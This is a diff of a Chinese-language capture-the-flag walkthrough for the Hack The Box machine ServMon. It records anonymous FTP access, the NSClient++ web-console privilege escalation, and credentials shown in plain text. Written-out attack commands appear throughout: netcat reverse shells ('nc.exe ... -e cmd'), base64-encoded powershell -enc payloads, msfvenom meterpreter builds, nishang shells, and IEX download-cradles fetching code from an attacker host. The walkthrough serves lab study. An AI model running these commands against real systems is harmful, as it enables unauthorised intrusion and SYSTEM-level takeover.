@@ -78,81 +78,6 @@ PORT      STATE SERVICE       VERSION
 49670/tcp open  msrpc         Microsoft Windows RPC
 2 services unrecognized despite returning data.
 ```
-```
-[★]$ ftp 10.129.227.77
-Connected to 10.129.227.77.
-220 Microsoft FTP Service
-Name (10.129.227.77:root): anonymous
-331 Anonymous access allowed, send identity (e-mail name) as password.
-Password: 
-230 User logged in.
-Remote system type is Windows_NT.
-
-ftp> dir
-229 Entering Extended Passive Mode (|||49680|)
-125 Data connection already open; Transfer starting.
-02-28-22  06:35PM       <DIR>          Users
-226 Transfer complete.
-ftp> cd Users
-250 CWD command successful.
-ftp> ls
-229 Entering Extended Passive Mode (|||49681|)
-150 Opening ASCII mode data connection.
-02-28-22  06:36PM       <DIR>          Nadine
-02-28-22  06:37PM       <DIR>          Nathan
-226 Transfer complete.
-
-ftp> ls Nathan
-229 Entering Extended Passive Mode (|||49683|)
-125 Data connection already open; Transfer starting.
-02-28-22  06:36PM                  182 Notes to do.txt
-226 Transfer complete.
-ftp> get "Nathan\\Notes to do.txt"
-local: Nathan\\Notes to do.txt remote: Nathan\\Notes to do.txt
-229 Entering Extended Passive Mode (|||49684|)
-125 Data connection already open; Transfer starting.
-100% |***********************************|   182        2.67 KiB/s    00:00 ETA
-226 Transfer complete.
-WARNING! 4 bare linefeeds received in ASCII mode.
-File may not have transferred correctly.
-182 bytes received in 00:00 (2.66 KiB/s)
-
-ftp> cd Nadine
-250 CWD command successful.
-ftp> dir
-229 Entering Extended Passive Mode (|||49685|)
-125 Data connection already open; Transfer starting.
-02-28-22  06:36PM                  168 Confidential.txt
-226 Transfer complete.
-ftp> get "Nadine\\Confidential.exe
-local: Nadine\\Confidential.exe remote: Nadine\\Confidential.exe
-229 Entering Extended Passive Mode (|||49686|)
-550 The system cannot find the path specified.   //550 是错误
-
-ftp> exit
-221 Goodbye.
-[★]$ ls
-'Nathan\\Notes to do.txt'
-
-[★]$ cd desktop
-bash: cd: desktop: No such file or directory
-[★]$ ls Desktop
-htb_vpn_logs.log  my_credentials.txt  my_data  README.license
-
-//Notes to do.txt包含关于已安装的任务的已完成和未完成任务的信息监控应用程序
-[★]$ cat 'Nathan\\Notes to do.txt'
-1) Change the password for NVMS - Complete
-2) Lock down the NSClient Access - Complete
-3) Upload the passwords
-4) Remove public access to NVMS
-5) Place the secret files in SharePoint
-
-[★]$ ls Desktop
-htb_vpn_logs.log  my_credentials.txt  my_data  README.license
-[★]$ cat Desktop/my_credentials.txt
-Username: syareya55
-Password: cqroAqyi
-```
 #### 对ftp的正确示范
 ```
 [★]$ ftp 10.129.227.77
@@ -554,35 +479,11 @@ nadine@SERVMON C:\Program Files\NSClient++>
 [★]$ echo '10.129.227.77' | sudo tee -a /etc/hosts
 10.129.227.77
 ```
+#### 下面的命令可以查看在浏览器对网页的配置：
 ```
-[★]$ searchsploit 'NSClient++'
----------------------------------------------- ---------------------------------
- Exploit Title                                |  Path
----------------------------------------------- ---------------------------------
-NSClient++ 0.5.2.35 - Authenticated Remote Co | json/webapps/48360.txt
-NSClient++ 0.5.2.35 - Privilege Escalation    | windows/local/46802.txt
----------------------------------------------- ---------------------------------
-Shellcodes: No Results
-[★]$ searchsploit -m windows/locak/46802.txt //前面下载过了
-  Exploit: NSClient++ 0.5.2.35 - Privilege Escalation
-      URL: https://www.exploit-db.com/exploits/46802
-     Path: /usr/share/exploitdb/exploits/windows/local/46802.txt
-    Codes: N/A
- Verified: False
-File Type: ASCII text, with very long lines (466)
-Copied to: /home/syareya55/46802.txt
+nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display       
+Current password: ew2x6SsGTxjRwXOT
 
-[★]$ cat 46802.txt
-Exploit:
-1. Grab web administrator password
-- open c:\program files\nsclient++\nsclient.ini
-or
-- run the following that is instructed when you select forget password
-	C:\Program Files\NSClient++>nscp web -- password --display
-	Current password: SoSecret
-
-```
-```
 nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini 
 ï»¿# If you want to fill this file with all available options run the following 
 command:
@@ -629,12 +530,18 @@ tcp   LISTEN 0      128                                            [::1]:8443   
 #### 该漏洞说明系统需要重新启动才能触发该漏洞，然而在挖掘web控制台时，我发现可以直接从web控制台执行脚本。
 #### 通过在web控制台中输入脚本的别名，我们可以手动执行负载。
 ```
-[★]$ wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe
-[★]$ echo '\programdata\nc.exe 10.10.14.134 443 -e cmd' > shell.bat
+[★]$ wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe //或者
+[★]$ locate nc.exe
+/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
+nadine@SERVMON C:\ProgramData>curl 10.10.15.132:8011/nc.exe -o nc.exe
+[★]$ cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
+
+[★]$ echo 'C:\\programdata\\nc.exe 10.10.14.134 443 -e cmd' > shell.bat
 [★]$ python3 -m http.server 8011
 Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
 
 ```
+#### 上传
 ```
 nadine@SERVMON C:\ProgramData>powershell
 Windows PowerShell
@@ -667,14 +574,33 @@ d-----        2/28/2022   5:44 PM                VMware
 
 PS C:\ProgramData>  
 ```
-```
- [★]$ sudo nc -lvnp 443
-listening on [any] 443 ...
-```
 #### https://localhost:8443
 #### 首先，我们必须转到NSClient++的settings选项卡，以便创建一个新脚本。
-#### Settings -> settings -> external scripts -> scripts -> 
-![图片](images/2026020904.png)
+#### Settings -> settings -> external scripts -> scripts -> Add New
+```
+Section		/settings/external scripts/scripts/11
+Key			command
+Value 		C:\\programdata\\shell.bat
+Add 		//点击红色的Change//点击第二个Save Configuration
+```
+#### scheduler -> schedules -> Add New
+```
+Section		/settings/external scripts/scripts/11
+Key			command
+Value		11
+Add 		//点击红色的Change//点击第二个Save Configuration
+```
+#### scheduler -> schedules -> 11
+```
+Section		/settings/external scripts/scripts/11
+Key			interval
+Value		1m
+Add 		//点击红色的Change//点击第二个Save Configuration
+```
+#### 不要侦听，点击Control -> Reload,等待，在Queries有了11,就升权成功了
+![图片](images/2026022601.png)
+#### 切记不要在网页配置前监听443端口，8443端口的网页配置是用来提权的，等他重置升权后在侦听，其实也不用使用payload。
+#### 如果在网页配置前监听443端口，结果1
 ```
  [★]$ sudo nc -lvnp 443
 listening on [any] 443 ...
@@ -686,10 +612,14 @@ connect to [85.9.194.108] from (UNKNOWN) [109.105.210.100] 38719
 ���+�/�.
 
 
-�┌//目标是用 HTTPS 连你，那你现在用的：nc -lvnp 443❌ 不行，因为 nc 不会解 TLS。
+�
 ```
-
-_________
+#### 如果在网页配置前监听443端口，结果2
+```
+[★]$ curl https://127.0.0.1:8443
+curl: (35) OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to 127.0.0.1:8443 
+```
+________
 ```
 PS C:\Users\Nadine> whoami /priv
 
@@ -725,122 +655,45 @@ command = 11
 interval = 1m
 PS C:\Program Files\NSClient++>
 ```
+#### 配置完成之后，就重置Reload
+```
+[★]$ echo ' C:\\programdata\\nc.exe 10.10.15.132 443 -e cmd' > shell.bat
+[★]$ cat shell.bat | iconv -t utf-16le | base64 -w 0
+XABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABuAGMALgBlAHgAZQAgADEAMAAuADEAMAAuADEANQAuADEAMwAyACAANAA0ADMAIAAtAGUAIABjAG0AZAAKAA==
+
+PS C:\ProgramData> powershell -enc QwA6AFwAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABcAG4AYwAuAGUAeABlACAAMQAwAC4AMQAwAC4AMQA1AC4AMQAzADIAIAA0ADQAMwAgAC0AZQAgAGMAbQBkAAoA
+
+[★]$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.15.132] from (UNKNOWN) [10.129.9.40] 50761
+Microsoft Windows [Version 10.0.17763.864]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:\ProgramData>whoami 
+whoami
+servmon\nadine
+
+nadine@SERVMON C:\ProgramData>exit
+```
+#### 这不是我们要的
+![图片](images/2026022602.png)
+```
+[★]$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.15.132] from (UNKNOWN) [10.129.9.40] 50777
+Microsoft Windows [Version 10.0.17763.864]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\NSClient++>whoami
+whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop>type root.txt
+```
+________________________
+### 以下是遇到的问题
 #### 1.侦听nc 的问题，在pwnbox上无法使用rlwrap ,反弹又是明文
 #### 2.在kali上可以使用rlwrap nc侦听https://127.0.0.1:8443 , 但有问题的是浏览器会打不开的情况，就算是google浏览器chromu啥的也不行
-————————————————————
-### 安装官方文档
-https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
-#### NSClient在NT AUTHORITY\SYSTEM上下文中运行，成功开发后，命令执行将在此上下文中实现。这个漏洞有效的先决条件是服务重新启动。让我们检查一下NSCP服务的权限，看看我们是否有权限重新启动它。这篇由Rohn Edwards撰写的博客文章展示了我们如何获得服务权限PowerShell。我们可以使用Msxml2.xmlhttpcom对象下载摇篮下载和在内存中执行脚本。然而，我们被拒绝访问服务控制管理器，因此我们必须承担服务重新启动
-```
-nadine@SERVMON C:\Users\Nadine> cmd /c "C:\Program Files\NSClient++\nscp.exe" --
-version
-NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
-```
-#### 我们找到了一个非默认应用程序，知道它安装的版本，并且可以以已认证用户的身份访问它。搜索影响此环境的漏洞，发现存在本地权限提升漏洞。成功利用此漏洞后，我们将以哪个用户身份执行代码？
-#### NT AUTHORITY\SYSTEM
-```
-[★]$ git clone https://github.com/PowerShellMafia/PowerSploit.git
-[★]$ cd PowerSploit/Privesc
-[~/PowerSploit/Privesc] [★]$ ls
-Get-System.ps1  PowerUp.ps1  Privesc.psd1  Privesc.psm1  README.md
-[~/PowerSploit/Privesc] [★]$ python3 -m http.server 8011
-
-先把 PowerUp.ps1 传到靶机内存：
-IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.134/PowerUp.ps1")
-然后用：
-方法 1（全面）：
-Invoke-AllChecks
-方法 2（只看服务相关）：
-Get-ModifiableService
-```
-```
-PS C:\ProgramData> powershell wget http://10.10.15.27:8011/PowerUp.ps1 -outfile PowerUp.ps1
-PS C:\ProgramData> . .\PowerUp.ps1
-
-PS C:\ProgramData> Invoke-AllChecks
-Get-WmiObject : Access denied  
-<SNIP>
- 
-ModifiablePath    : C:\Users\Nadine\AppData\Local\Microsoft\WindowsApps
-IdentityReference : SERVMON\Nadine
-Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}       
-%PATH%            : C:\Users\Nadine\AppData\Local\Microsoft\WindowsApps
-Name              : C:\Users\Nadine\AppData\Local\Microsoft\WindowsApps
-Check             : %PATH% .dll Hijacks
-AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Nadine\AppData\Local\Mic 
-                    rosoft\WindowsApps\wlbsctrl.dll' //某些高权限程序可能会从 PATH 里加载 DLL
-
-DefaultDomainName    : SERVMON
-DefaultUserName      : Nathan
-DefaultPassword      :
-AltDefaultDomainName :
-AltDefaultUserName   :
-AltDefaultPassword   :
-Check                : Registry Autologons
-
-
-
-PS C:\ProgramData> //深挖 Autologon 注册表
-PS C:\ProgramData> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\
-Winlogon"
-
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon        
-    AutoRestartShell    REG_DWORD    0x1
-    Background    REG_SZ    0 0 0
-    CachedLogonsCount    REG_SZ    10
-    DebugServerCommand    REG_SZ    no
-    DefaultDomainName    REG_SZ    SERVMON
-    DefaultUserName    REG_SZ    Nathan
-    DisableBackButton    REG_DWORD    0x1
-    EnableSIHostIntegration    REG_DWORD    0x1
-    ForceUnlockLogon    REG_DWORD    0x0
-    LegalNoticeCaption    REG_SZ
-    LegalNoticeText    REG_SZ     
-    PasswordExpiryWarning    REG_DWORD    0x5
-    PowerdownAfterShutdown    REG_SZ    0
-    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}   
-    ReportBootOk    REG_SZ    1
-    Shell    REG_SZ    explorer.exe
-    ShellCritical    REG_DWORD    0x0
-    ShellInfrastructure    REG_SZ    sihost.exe
-    SiHostCritical    REG_DWORD    0x0
-    SiHostReadyTimeOut    REG_DWORD    0x0
-    SiHostRestartCountLimit    REG_DWORD    0x0
-    SiHostRestartTimeGap    REG_DWORD    0x0
-    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
-    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
-    WinStationsDisabled    REG_SZ    0
-    scremoveoption    REG_SZ    0
-    DisableCAD    REG_DWORD    0x1
-    LastLogOffEndTimePerfCounter    REG_QWORD    0x1064398d6
-    ShutdownFlags    REG_DWORD    0x8000022b
-    AutoAdminLogon    REG_DWORD    0x1
-    AutoLogonSID    REG_SZ    S-1-5-21-3217154428-562821044-1828981534-1000     
-    LastUsedUsername    REG_SZ    Nathan
-
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Alterna
-teShells
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExten
-sions
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDef
-aults
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLog
-onChecked
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Volatil
-eUserMgrKey
-PS C:\ProgramData>
-
-```
-
-```
-[★]$ ssh nadine@10.129.227.77
-nadine@10.129.227.77's password:
-
-
-nadine@SERVMON C:\Users\Nadine> powershell
-PS C:\Users\Nadine> . .\PowerUp.ps1  //同上一样的结果
-```
-#### 直接下载工具，浏览器永久了打不开
 ```
 [★]$ git clone https://github.com/GreatSCT/GreatSCT
 [★]$ cd GreatSCT
@@ -881,393 +734,4 @@ Saved as: rev.exe
  [★]$ python3 -m http.server 8011
 Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
 ```
-
-```
-[★]$ msfconsole
-Metasploit tip: View all productivity tips with the tips command
-                                                  
-                                              `:oDFo:`                            
-                                           ./ymM0dayMmy/.                          
-                                        -+dHJ5aGFyZGVyIQ==+-                    
-                                    `:sm⏣~~Destroy.No.Data~~s:`                
-                                 -+h2~~Maintain.No.Persistence~~h+-              
-                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
-                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
-                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
-                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
-                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
-                      :we're.all.alike'`                     The.PFYroy.No.D7:  
-                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
-                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
-                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
-                      :<script>.Ac816/                        sENbove3101.404:    
-                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
-                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
-                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
-                      :#OUTHOUSE-  -s:                       /corykennedyData:    
-                      :$nmap -oS                              SSo.6178306Ence:    
-                      :Awsm.da:                            /shMTl#beats3o.No.:    
-                      :Ring0:                             `dDestRoyREXKC3ta/M:    
-                      :23d:                               sSETEC.ASTRONOMYist:    
-                       /-                        /yo-    .ence.N:(){ :|: & };:    
-                                                 `:Shall.We.Play.A.Game?tron/    
-                                                 ```-ooy.if1ghtf0r+ehUser5`    
-                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
-                                              `MjM~~WE.ARE.se~~MMjMs              
-                                               +~KANSAS.CITY's~-`                  
-                                                J~HAKCERS~./.`                    
-                                                .esc:wq!:`                        
-                                                 +++ATH`                            
-                                                  `
-
-
-       =[ metasploit v6.4.71-dev                          ]
-+ -- --=[ 2529 exploits - 1302 auxiliary - 431 post       ]
-+ -- --=[ 1669 payloads - 49 encoders - 13 nops           ]
-+ -- --=[ 9 evasion                                       ]
-
-Metasploit Documentation: https://docs.metasploit.com/
-
-[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/shell_reverse_tcp
-payload => windows/x64/shell_reverse_tcp
-[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.15.27
-LHOST => 10.10.15.27
-[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 1234
-LPORT => 1234
-[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
-[*] Started reverse TCP handler on 10.10.15.27:1234
-```
-_____________
-```
-PS C:\programdata> powershell wget http://10.10.15.27:8011/rev.exe -outfile rev.
-exe
-PS C:\programdata> powershell wget http://10.10.15.27:8011/shell.bat -outfile sh
-ell.bat
-PS C:\programdata> dir
-
-
-    Directory: C:\programdata
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-----        2/28/2022   6:32 PM                chocolatey
-d---s-        2/28/2022   3:55 PM                Microsoft
-d-----        2/28/2022   6:46 PM                NVMS-1000
-d-----        2/28/2022   6:24 PM                Package Cache
-d-----        2/25/2025   5:39 AM                regid.1991-06.com.microsoft    
-d-----        9/15/2018  12:19 AM                SoftwareDistribution
-d-----        2/25/2025   5:46 AM                ssh
-d-----        9/15/2018  12:19 AM                USOPrivate
-d-----       11/11/2019   6:52 PM                USOShared
-d-----        2/28/2022   5:44 PM                VMware
--a----        2/13/2026   4:35 AM           7168 rev.exe
--a----        2/13/2026   5:07 AM             23 shell.bat
-
-```
-#### 应该使用443端口
-```
-[★]$ echo 'C:\programdata\rev.exe' > shell.bat
-[★]$ cat shell.bat
-C:\programdata\rev.exe
-
-[★]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.27 LPORT=443 -f exe -o rev.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: rev.exe
-[★]$ python3 -m http.server 8011
-Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
-
-sudo msfconsole
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set LHOST 10.10.15.27
-set LPORT 443
-run
-```
-______________
-
-换kali
-```
-┌──(parallels㉿kali-linux-2024-2)-[~]
-└─$ vi shell.bat
-┌──(parallels㉿kali-linux-2024-2)-[~]
-└─$ cat shell.bat
-\programdata\nc.exe 10.10.15.27 443 -e cmd
-┌──(parallels㉿kali-linux-2024-2)-[~]
-└─$ python3 -m http.server 8011
-Serving HTTP on 0.0.0.0 port 8011 (http://0.0.0.0:8011/) ...
-
-
-```
-```
-nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
-Current password: ew2x6SsGTxjRwXOT
-
-nadine@SERVMON C:\>powershell
-Windows PowerShell
-Copyright (C) Microsoft Corporation. All rights reserved.
-PS C:\programdata> powershell wget http://10.10.15.27:8011/shell.bat -outfile shell.bat
-PS C:\programdata> powershell wget http://10.10.15.27:8011/nc64.exe -outfile nc.exe
-PS C:\programdata> dir
-
-
-    Directory: C:\programdata
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-----        2/28/2022   6:32 PM                chocolatey
-d---s-        2/28/2022   3:55 PM                Microsoft
-d-----        2/28/2022   6:46 PM                NVMS-1000
-d-----        2/28/2022   6:24 PM                Package Cache
-d-----        2/25/2025   5:39 AM                regid.1991-06.com.microsoft
-d-----        9/15/2018  12:19 AM                SoftwareDistribution
-d-----        2/25/2025   5:46 AM                ssh
-d-----        9/15/2018  12:19 AM                USOPrivate
-d-----       11/11/2019   6:52 PM                USOShared
-d-----        2/28/2022   5:44 PM                VMware
--a----        2/13/2026   5:34 AM          45272 nc.exe
--a----        2/13/2026   5:34 AM             43 shell.bat
-
-
-PS C:\programdata>  
-
-
-```
-______________
-```
-$ echo 'ping -n 1 10.10.14.2' | iconv -t utf-16le
-$ echo 'ping -n 1 10.10.14.2' | iconv -t utf-16le | base64 -w 0
-//这两行命令是在把一条 Windows 命令变成 PowerShell 可用的 Base64 编码格式，常用于 HTB 里绕过限制或构造 payload
-//为什么要转 UTF-16LE？
-因为 PowerShell 的 -EncodedCommand 参数只接受 UTF-16LE 编码后的 Base64。
-//powershell -enc 的规则是：
-Base64 解码后，必须是 PowerShell要直接执行的一条命令字符串
-
-sudo tcpdump -i tun0 icmp
-Moudules && Queries : CheckExternalScripts ,Run
-
-
-cp /usr/share/nishang/Shells/Invoke-PowershellTcp .ps1
-vi ~  
-FoobatSubscribe -Reverse -IPAddress 10.10.14.27 -Port 9011
-
-
-$ cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0
-> echo powshell -enc 粘贴 > evil.bat
-也可以
-> powershell -enc 粘贴
-
-nc -lvnp 9001
-
-Queries/ foobat run
-
-
-> nc.exe -e cmd 10.10.14.2 9001
-```
-
-______________-
-```
-PS C:\programdata> .\nc.exe -e cmd 10.10.14.152 443
-
-$ sudo rlwrap nc -lvnp 443                                                          
-[sudo] password for parallels: 
-listening on [any] 443 ...
-connect to [10.10.14.152] from (UNKNOWN) [10.129.227.77] 50893
-Microsoft Windows [Version 10.0.17763.864]
-(c) 2018 Microsoft Corporation. All rights reserved.
-
-nadine@SERVMON C:\programdata>whoami
-whoami
-servmon\nadine
-
-```
-
-```
-PS C:\programdata> echo 'C:\programdata\nc.exe -e cmd 10.10.14.152 443' > evil.bat
-
-
-[★]$ echo '\programdata\nc.exe 10.10.15.132 443 -e cmd' > shell.bat
-[★]$ cat shell.bat | iconv -t utf-16le | base64 -w 0
-XABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXABuAGMALgBlAHgAZQAgADEAMAAuADEAMAAuADEANQAuADEAMwAyACAANAA0ADMAIAAtAGUAIABjAG0AZAAKAA==
-```
-____________________
-```
-[★]$ ls /usr/share/nishang/Shells/
-Invoke-ConPtyShell.ps1               Invoke-PowerShellTcp.ps1
-Invoke-JSRatRegsvr.ps1               Invoke-PowerShellUdpOneLine.ps1
-Invoke-JSRatRundll.ps1               Invoke-PowerShellUdp.ps1
-Invoke-PoshRatHttp.ps1               Invoke-PowerShellWmi.ps1
-Invoke-PoshRatHttps.ps1              Invoke-PsGcatAgent.ps1
-Invoke-PowerShellIcmp.ps1            Invoke-PsGcat.ps1
-Invoke-PowerShellTcpOneLineBind.ps1  Remove-PoshRat.ps1
-Invoke-PowerShellTcpOneLine.ps1
-[★]$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
-[★]$ vi Invoke-PowerShellTcp.ps1 //修改里面的IP && port
-
-
-cmd.exe
-powershell -nop -w hidden -enc 你的Base64
-```
-```
-nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display       
-Current password: ew2x6SsGTxjRwXOT
-
-nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display       
-Current password: ew2x6SsGTxjRwXOT
-
-nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini 
-ï»¿# If you want to fill this file with all available options run the following 
-command:
-#   nscp settings --generate --add-defaults --load-all
-# If you want to activate a module and bring in all its options use:
-#   nscp settings --activate-module <MODULE NAME> --add-defaults
-# For details run: nscp settings --help
-
-
-; in flight - TODO
-[/settings/default]
-
-; Undocumented key
-password = ew2x6SsGTxjRwXOT
-
-; Undocumented key
-allowed hosts = 127.0.0.1
-
-
-; in flight - TODO
-[/settings/NRPE/server]
-
-; Undocumented key
-ssl options = no-sslv2,no-sslv3
-
-; Undocumented key
-verify mode = peer-cert
-
-; Undocumented key
-insecure = false
-
-
-; in flight - TODO
-[/modules]
-
-; Undocumented key
-CheckHelpers = disabled
-
-; Undocumented key
-CheckEventLog = disabled
-
-; Undocumented key
-CheckNSCP = disabled
-
-; Undocumented key
-CheckDisk = disabled
-
-; Undocumented key
-CheckSystem = disabled
-
-; Undocumented key
-WEBServer = enabled
-
-; Undocumented key
-NRPEServer = enabled
-
-; CheckTaskSched - Check status of your scheduled jobs.
-CheckTaskSched = enabled
-
-; Scheduler - Use this to schedule check commands and jobs in conjunction with f
-or instance passive monitoring through NSCA
-Scheduler = enabled
-
-; CheckExternalScripts - Module used to execute external scripts
-CheckExternalScripts = enabled
-
-
-; Script wrappings - A list of templates for defining script commands. Enter any
- command line here and they will be expanded by scripts placed under the wrapped
- scripts section. %SCRIPT% will be replaced by the actual script an %ARGS% will 
-be replaced by any given arguments.
-[/settings/external scripts/wrappings]
-
-; Batch file - Command used for executing wrapped batch files
-bat = scripts\\%SCRIPT% %ARGS%
-
-; Visual basic script - Command line used for wrapped vbs scripts
-vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%     
-
-; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell)
- scripts
-ps1 = cmd /c echo If (-Not (Test-Path "scripts\%SCRIPT%") ) { Write-Host "UNKNOW
-N: Script `"%SCRIPT%`" not found."; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($la
-stexitcode) | powershell.exe /noprofile -command -
-
-
-; External scripts - A list of scripts available to run from the CheckExternalSc
-ripts module. Syntax is: `command=script arguments`
-[/settings/external scripts/scripts]
-
-
-; Schedules - Section for the Scheduler module.
-[/settings/scheduler/schedules]
-
-; Undocumented key
-foobar = command = foobar
-
-
-; External script settings - General settings for the external scripts module (C
-heckExternalScripts).
-[/settings/external scripts]
-allow arguments = true
-
-
-; in flight - TODO
-[/settings/external scripts/scripts/11]
-
-; COMMAND - Command to execute
-command = c:\\programdata\\shell.bat
-
-
-; in flight - TODO
-[/settings/scheduler/schedules/11]
-
-; SCHEDULE COMMAND - Command to execute
-command = 11
-
-; SCHEDULE INTERAVAL - Time in seconds between each check
-interval = 1m
-
-nadine@SERVMON C:\Program Files\NSClient++>
-
-```
-```
-[★]$ ls /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 
-/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
-[★]$ cp  /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
-
-nadine@SERVMON C:\ProgramData>powershell "(New-Object Net.WebClient).downloadStr
-ing('http://10.10.15.132:8011/Invoke-PowerShellTcp.ps1')"
-
-```
-```
-[★]$ locate nc.exe
-/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
-nadine@SERVMON C:\ProgramData>curl 10.10.15.132:8011/nc.exe -o nc.exe
-[★]$ cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
-
-nadine@SERVMON C:\ProgramData>curl 10.10.15.132:8011/nc.exe -o nc.exe
-
-
-nadine@SERVMON C:\ProgramData>echo c:\programdata\nc.exe -e cmd 10.10.15.132 443
- >  shell.bat 
-```
-___________
-```
-[★]$ curl https://127.0.0.1:8443
-curl: (35) OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to 127.0.0.1:8443 
-```
+#### 也使用过msfconsole 不行
